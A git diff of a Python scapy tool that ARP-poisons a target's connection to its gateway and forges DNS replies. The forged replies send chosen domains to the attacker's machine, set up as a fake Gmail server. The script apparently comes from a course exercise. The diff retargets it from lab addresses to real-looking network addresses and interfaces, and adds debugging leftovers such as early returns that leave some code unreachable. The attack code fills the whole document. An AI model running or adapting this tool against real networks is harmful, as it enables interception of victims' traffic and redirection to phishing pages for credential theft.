@@ -5,18 +5,19 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
 import scapy.all as scapy
 import time
 
-DOOFENSHMIRTZ_IP = "10.0.0.1"  # Erel IP
-SECRATERY_IP = "10.0.0.2"  # My IP
-NETWORK_DNS_SERVER_IP = "10.0.0.138"  # Enter the network's DNS server's IP.
+DOOFENSHMIRTZ_IP = "132.64.142.61"  # Erel IP
+SECRATERY_IP = "132.64.142.16"  # My IP
+GATEAWAY='132.64.142.1'
+NETWORK_DNS_SERVER_IP = "132.64.17.52"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
-IFACE = "Intel(R) Ethernet Connection (13) I219-V"  # Enter the network interface you work on.
-
+IFACE = "Realtek USB GbE Family Controller"  # Enter the network interface you work on.
+IFACE_REAL = "Intel(R) Wi-Fi 6 AX201 160MHz"
 FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    "hello.co.il": FAKE_GMAIL_IP
+    "aaabbbccc.com": FAKE_GMAIL_IP
 }
 
 
@@ -49,7 +50,7 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        response = scapy.sr1(ARP(op=1, pdst=DOOFENSHMIRTZ_IP), timeout=2, verbose=0)
+        response = scapy.sr1(ARP(op=1, pdst=DOOFENSHMIRTZ_IP), timeout=2, verbose=0, iface=IFACE)
         print(response.hwsrc)
         return response.hwsrc
 
@@ -61,7 +62,7 @@ class ArpSpoofer(object):
 
         packet = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.spoof_ip)
 
-        scapy.send(packet, verbose=0)
+        scapy.send(packet, verbose=0, iface=IFACE)
 
         self.spoof_count += 1
         print("Sent overall ", self.spoof_count)
@@ -116,9 +117,17 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return DNS response to pkt, source IP changed.
         """
-        pkt[IP].dst = "8.8.8.8"
-        res = sr1(pkt)
+        pkt = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd='www.tapooz.com.')
+        print(sr1(pkt))
+        return pkt
+        target_ip = pkt[IP].src
+        url = pkt[DNS].qd.qname.decode() 
+        pkt = IP(dst=REAL_DNS_SERVER_IP) / UDP(dport=53, sport=5252) / DNS(rd=1,qd=DNSQR(qname=url))
+        print(f'packet to send: {pkt}')
+        res = sr1(pkt, iface=IFACE_REAL)
+        print(f'got res: {res}')
         res[IP].src = NETWORK_DNS_SERVER_IP
+        res[IP].dst = target_ip
         return res
 
         # לדעתי זה לא עובד בכלל
@@ -133,10 +142,28 @@ class DnsHandler(object):
         @return fake DNS response to the request.
         """
         print(f'got packet {pkt}')
-        print(f'sending response to {to}')
-        response = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53) /\
-            DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=to))
+        url =pkt[DNS].qd.qname.decode()[:-1]
+        print(f'weird value: {pkt[DNSQR].qname}')
+        print(f'sending response with value {to}')
 
+        dns = DNS(
+            id=pkt[DNS].id,
+            qd=pkt[DNS].qd,
+            aa=1,
+            rd=0,
+            qr=1,
+            qdcount=1,
+            ancount=1,
+            nscount=0,
+            arcount=0,
+            ar=DNSRR(
+                rrname=pkt[DNS].qd.qname,
+                type='A',
+                ttl=600,
+                rdata=to)
+        )
+        response = IP(dst=pkt[IP].src, src=NETWORK_DNS_SERVER_IP)/UDP(dport=pkt[UDP].sport, sport=53) / dns
+        print(f'preparing to send {response}')
         return response
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
@@ -148,16 +175,17 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return string describing the choice made
         """
-
+        print(f'got packet: {pkt}')
         url =pkt[DNS].qd.qname.decode()[:-1]
         if url in SPOOF_DICT:
             print(f'got DNS request: {url}')
-            scapy.send(self.get_spoofed_dns_response(pkt, to=SPOOF_DICT[url]))
+            scapy.send(self.get_spoofed_dns_response(pkt, to=SPOOF_DICT[url]), iface=IFACE)
             return f"[DNS_SPOOF] found a dns query to {url}, return the local server"
-        # scapy.send(self.get_real_dns_response(pkt))
+        print(self.get_real_dns_response(pkt))
+        return ''
+        scapy.send(self.get_real_dns_response(pkt), iface=IFACE)
         #return f"[DNS_SPOOF] found a DNS request to {pkt['DNS Question Record'].qname} and handled it correctly"
         return ''
-
     def run(self) -> None:
         """
         Main loop of the process. Sniffs for packets on the interface and sends DNS
@@ -181,9 +209,8 @@ class DnsHandler(object):
 
 
 if __name__ == "__main__":
-    print(scapy.get_if_list())
     plist = []
-    spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
+    spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, GATEAWAY)
     server = DnsHandler(plist, SPOOF_DICT)
 
     print("Starting sub-processes...")
